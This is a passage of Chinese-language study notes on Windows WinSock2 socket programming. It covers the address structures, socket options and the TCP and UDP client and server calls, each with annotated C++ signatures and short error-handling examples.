class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>IPv4地址结构</p><blockquote><p>使用时应该把 sockaddr_in强转为sockaddr传递。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 地址结构</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr</span></span><br><span class="line">&#123;</span><br><span class="line">    ushort sa_family ; <span class="comment">// 地址族标识符</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>] ; <span class="comment">// 存储地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用的IPv4地址结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">in_addr</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">u_char s_b1, s_b2, s_b3, s_b4;</span><br><span class="line">        &#125; S_un_b;</span><br><span class="line">    <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">u_short s_w1, s_w2;</span><br><span class="line">        &#125; S_un_w;</span><br><span class="line">u_long S_addr;</span><br><span class="line">    &#125; S_un;</span><br><span class="line">&#125;IN_ADDR,*PIN_ADDR,FAR* LPIN_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于填写IP和端口</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> sin_family; <span class="comment">// 地址族</span></span><br><span class="line">    u_short sin_port; <span class="comment">// 端口号</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr; <span class="comment">// IPv4地址（使用为 hints.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);）</span></span><br><span class="line">    <span class="type">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">// 保留</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>IPv6地址结构</p><blockquote><p>使用时应该把 sockaddr_in6强转为sockaddr传递。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常用的IPv6地址结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">in6_addr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">u_char Byte[<span class="number">16</span>];</span><br><span class="line">        u_short Word[<span class="number">8</span>];</span><br><span class="line">    &#125;u;</span><br><span class="line">&#125;IN6_ADDR,*PIN6_ADDR,FAR* LPIN6_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于填写IPv6和端口</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span></span><br><span class="line">&#123;       </span><br><span class="line">    <span class="type">short</span> sin6_family; <span class="comment">// 地址族</span></span><br><span class="line">    u_short sin6_port; <span class="comment">// 端口号</span></span><br><span class="line">    u_long sin6_flowinfo; <span class="comment">// 流信息</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> sin6_addr; <span class="comment">// IPv6地址</span></span><br><span class="line">    <span class="type">char</span> sin6_scope_id;<span class="comment">// Scope标识</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>addrinfo</p><blockquote><p>WinSock2增加的一个以链表形式保存地址信息的函数。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getaddrinfo()获得地址</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">addrinfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ai_flags; <span class="comment">// getaddrinfo函数的调用选项</span></span><br><span class="line">    <span class="type">int</span> ai_family; <span class="comment">// 地址族</span></span><br><span class="line">    <span class="type">int</span> ai_socktype; <span class="comment">// 套接字类型</span></span><br><span class="line">    <span class="type">int</span> ai_protocol; <span class="comment">// 协议</span></span><br><span class="line">    <span class="type">size_t</span> ai_addrlen; <span class="comment">// ai_addr指向的sockaddr结构的缓冲区字节长度</span></span><br><span class="line">    <span class="type">char</span>* ai_canonname; <span class="comment">// 主机的正规名称</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr</span>* ai_addr; <span class="comment">// 以sockaddr结构描述的地址信息</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">addrinfo</span>* ai_next; <span class="comment">// 指向下一个addrinfo结构</span></span><br><span class="line">&#125;ADDRINFOA,*PADDRINFOA;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得地址</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getaddrinfo</span></span></span><br><span class="line"><span class="function"><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">char</span>* hostname, <span class="comment">// 主机名（无填NULL）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">char</span>* service, <span class="comment">// 端口号</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="keyword">struct</span> addrinfo* hints, <span class="comment">// 输入类型结构体</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> addrinfo** result <span class="comment">// 返回获得地址的结构体</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>IPv4点分与无符号整形转化</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IP-&gt;u_long</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">inet_addr</span><span class="params">( __in <span class="type">const</span> <span class="type">char</span>* cp)</span></span>;    </span><br><span class="line"><span class="comment">// u_long-&gt;IP</span></span><br><span class="line"><span class="function"><span class="type">char</span> *FAR <span class="title">inet_ntoa</span><span class="params">( __in <span class="keyword">struct</span> in_addr in)</span></span>;     </span><br></pre></td></tr></table></figure></li><li><p>套接字选项</p><blockquote><p><a href="https://blog.csdn.net/x13262608581/article/details/109144584">套接字选项</a></p><p><a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=57749149&amp;ss_c=ssc.citiao.link">套接口</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取套接字选项</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getsockopt</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in socket s, <span class="comment">// 一个标识套接口的描述字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> level, <span class="comment">// 选项定义的层次。支持的层次仅有SOL_SOCKET和IPPROTO_TCP。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> optname, <span class="comment">// 需获取的套接口选项。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="type">char</span>* optval, <span class="comment">// 指针，指向存放所获得选项值的缓冲区。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __inout <span class="type">int</span>* optlen, <span class="comment">// 指针，指向optval缓冲区的长度值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置套接字选项</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setsockopt</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in socket s, <span class="comment">// 一个标识套接口的描述字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> level, <span class="comment">// 选项定义的层次。支持的层次仅有SOL_SOCKET和IPPROTO_TCP。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> optname, <span class="comment">// 需获取的套接口选项。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="type">char</span>* optval, <span class="comment">// 指针，指向存放所获得选项值的缓冲区。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> optlen, <span class="comment">// 指向optval缓冲区的长度值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例子</span></span><br><span class="line"><span class="comment">// 超时设置</span></span><br><span class="line"><span class="type">int</span> time = <span class="number">1000</span>; <span class="comment">// 毫秒</span></span><br><span class="line"><span class="type">int</span> r = <span class="built_in">setsockopt</span>(s,SOL_SOCKET,SO_RCVTIMEO,(<span class="type">const</span> <span class="type">char</span>*)&amp;time,<span class="built_in">sizeof</span>(time));</span><br><span class="line"><span class="comment">// 广播</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> time = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">setsockopt</span>(s,SOL_SOCKET,SO_BROADCAST,(<span class="type">const</span> <span class="type">char</span>*)&amp;time,<span class="built_in">sizeof</span>(time));</span><br></pre></td></tr></table></figure><p><img src="/posts/4962e50b/套接字可选项1.jpg" alt="img"><img src="/posts/4962e50b/套接字可选项2.jpg" alt="img"></p></li><li><p>I/O控制命令</p><blockquote><p><a href="https://baike.sogou.com/v74039035.htm?fromTitle=WSAIoctl(">int WSAAPI WSAIoctl()</a>)</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 控制套接字I/O模式</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ioctlsocket</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in <span class="type">int</span> s, <span class="comment">// 套接字句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">long</span> cmd, <span class="comment">// 指示在套接字上要执行的命令</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in_out u_long * argp <span class="comment">// 指向cmd的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例</span></span><br><span class="line"><span class="comment">// 设置网卡混杂模式</span></span><br><span class="line">u_long optival = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">isoctlsocket</span>(s,SIO_RCVALL,&amp;optival);</span><br></pre></td></tr></table></figure><p><img src="/posts/4962e50b/IO控制命令可选项.jpg" alt="img"></p></li><li><p>补充</p><ul><li><p>WSAGetLastError()</p><blockquote><p>获得上次失败操作的错误码。</p></blockquote></li><li><p><a href="https://baike.sogou.com/v71802588.htm?fromTitle=shutdown(">shutdown()</a>)</p><blockquote><p>禁止某些操作。</p></blockquote></li></ul></li></ul><h3 id="4-TCP函数"><a href="#4-TCP函数" class="headerlink" title="4 TCP函数"></a>4 TCP函数</h3><ul><li><p>TCP通信过程</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务器进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// 创建套接字，指定使用TCP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定本地地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();<span class="built_in">bind</span>();</span><br><span class="line"><span class="comment">// 等待客户连接请求</span></span><br><span class="line"><span class="built_in">listen</span>();</span><br><span class="line"><span class="comment">// 进行数据传输</span></span><br><span class="line"><span class="built_in">accept</span>();<span class="built_in">send</span>();<span class="built_in">recv</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">//结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// 创建套接字，指定使用TCP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定服务器地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();</span><br><span class="line"><span class="comment">// 向服务器发送连接请求</span></span><br><span class="line"><span class="built_in">connect</span>();</span><br><span class="line"><span class="comment">// 进行数据传输</span></span><br><span class="line"><span class="built_in">send</span>();<span class="built_in">recv</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">// 结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure></li><li><p>套接字</p><blockquote><p><a href="https://baike.sogou.com/v397785.htm?fromTitle=WSASocket(">socket WSASocket()</a>)：创建套接字。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建套接字</span></span><br><span class="line"><span class="function">socket WSAAPI <span class="title">socket</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> af, <span class="comment">// 确定套接字通信地址族（例：AF_INET）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> type, <span class="comment">// 套接字类型（例：SOCK_STREAM）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> protocol, <span class="comment">// 指定通信协议（例：IPPROTO_TCP）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>;</span><br><span class="line"><span class="comment">// 非负值表示成功，-1表示失败，可以用WSAGetLastError()获得失败码。</span></span><br><span class="line">ConnectSocket = <span class="built_in">socket</span>(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">closesocket</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 非负值表示成功，-1表示失败，可以用WSAGetLastError()获得失败码。</span></span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br></pre></td></tr></table></figure></li><li><p>获取地址</p><blockquote><p><a href="https://baike.sogou.com/v63124712.htm?fromTitle=getaddrinfo">getaddrinfo()</a>：获得主机地址。</p><p><a href="https://blog.csdn.net/tomatolee221/article/details/89641975">gethostbyname()</a>：依据主机名获得IP地址。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将套接字与本地地址关联（服务器端）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 地址或端口填0将由操作系统自动选择</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">bind</span>(ListenSocket, result-&gt;ai_addr, (<span class="type">int</span>)result-&gt;ai_addrlen);</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">freeaddrinfo</span>(result);</span><br><span class="line">    <span class="built_in">closesocket</span>(ListenSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得套接字关联的本地端点地址</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getsockname</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> *namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数用于对本地套接字进行bind()或connect()后获得这个套接字的地址信息。</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 获得套接字关联的本地端点地址 </span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getsockname</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">__out <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">__inout <span class="type">int</span>* namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数用于获得已连接套接字的对等方端点地址，获得的端点地址保存在name中返回。</span></span></span><br></pre></td></tr></table></figure></li><li><p>连接请求</p><blockquote><p><a href="https://www.cnblogs.com/yangwenxin/p/6601194.html">socket_listen里面第二个参数backlog的用处</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 连接服务器</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">connect</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> sockaddr* name, <span class="comment">// 地址参数，被声明为一个指向sockaddr结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> namelen <span class="comment">// 地址结构大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">iResult = <span class="built_in">connect</span>(ConnectSocket,ptr-&gt;ai_addr,(<span class="type">int</span>)ptr-&gt;ai_addrlen);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    ConnectSocket = INVALID_SOCKET;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听等待TCP连接</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> backlog, <span class="comment">// 等待握手队列长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">listen</span>(ListenSocket, SOMAXCONN);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;listen failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ListenSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于从已完成连接的连接请求队列中返回一个已完成连接的客户请求</span></span><br><span class="line"><span class="function">SOECKT <span class="title">accept</span>    </span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCEKT s, <span class="comment">// 已绑定并设置为“监听”状态的套接字（该套接字不可以用来通信）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="keyword">struct</span> sockaddr* addr, <span class="comment">// 被声明为一个指向sockaddr结构的指针（客户端IP，不需要输入NULL）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __inout <span class="type">int</span> *addrlen <span class="comment">// 地址结构长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数会返回另一个用于数据传输的套接字，被称为已连接套接字，负责与本次连接的客户通信。</span></span></span><br><span class="line"><span class="function">ClientSocket </span>= <span class="built_in">accept</span>(ListenSocket,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ClientSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;accept failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ListenSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>传输数据</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">send</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="type">char</span>* buf, <span class="comment">// 要发送的字节序列</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 发送的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags, <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 该函数返回实际发送了的字节总数</span></span><br><span class="line"><span class="comment">// 在流式套接字中服务器调用accept()/客户端调用connect()函数完成了地址绑定，所以不用地址</span></span><br><span class="line">iResult = <span class="built_in">send</span>(ConnectSocket,sendbuf,(<span class="type">int</span>)<span class="built_in">strlen</span>(sendbuf),<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">recv</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="type">char</span>* buf, <span class="comment">// 接受缓冲区</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 接受缓冲区的字节长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数返回实际接收了的字节总数。</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">recv</span>(ConnectSocket,recvbuf,recvbuflen,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(iResult &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bytes received: %d\n&quot;</span>, iResult);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(iResult == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recv failed with error: %d\n&quot;</span>,<span class="built_in">WSAGetLastError</span>());</span><br></pre></td></tr></table></figure></li><li><p>TCP参数</p><p><code>socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</code></p></li></ul><h3 id="5-UDP函数"><a href="#5-UDP函数" class="headerlink" title="5 UDP函数"></a>5 UDP函数</h3><ul><li><p>UDP通信过程</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务器进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// （不同于TCP）创建套接字，指定使用UDP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定本地地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();<span class="built_in">bind</span>();</span><br><span class="line"><span class="comment">// （不同于TCP）等待客户连接请求</span></span><br><span class="line"><span class="comment">// （不同于TCP）进行数据传输</span></span><br><span class="line"><span class="built_in">recvfrom</span>();<span class="built_in">sendto</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">// 结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端进程</span></span><br><span class="line"><span class="comment">// Windows Sockets DLL初始化，协商版本号</span></span><br><span class="line"><span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="comment">// （不同于TCP）创建套接字，指定使用UDP通信</span></span><br><span class="line"><span class="built_in">socket</span>();</span><br><span class="line"><span class="comment">// 指定服务器地址和通信端口</span></span><br><span class="line"><span class="built_in">getaddrinfo</span>();</span><br><span class="line"><span class="comment">// （不同于TCP）向服务器发送连接请求</span></span><br><span class="line"><span class="comment">// （不同于TCP）进行数据传输</span></span><br><span class="line"><span class="built_in">recvfrom</span>();<span class="built_in">sendto</span>();</span><br><span class="line"><span class="comment">// 关闭套接字</span></span><br><span class="line"><span class="built_in">shutdown</span>();<span class="built_in">closesocket</span>();</span><br><span class="line"><span class="comment">// 结束对Windows Sockets DLL的使用，释放资源</span></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure></li><li><p>连接模式</p><ul><li>connect() 连接，不同于TCP三次握手，仅仅是绑定IP和port，不会产生网络活动。</li><li>connect() 重新绑定套接字可以更新IP和port。</li><li>再次调用connect() 时，若之前把套接字地址结构设置成AF_UNSPEC，后续的send()和recv()将出错。</li></ul></li><li><p>传输数据</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sendto</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="type">char</span>* buf, <span class="comment">// 要发送的字节序列</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 发送的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags, <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> sockaddr* to, <span class="comment">// 目的地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> tolen <span class="comment">// 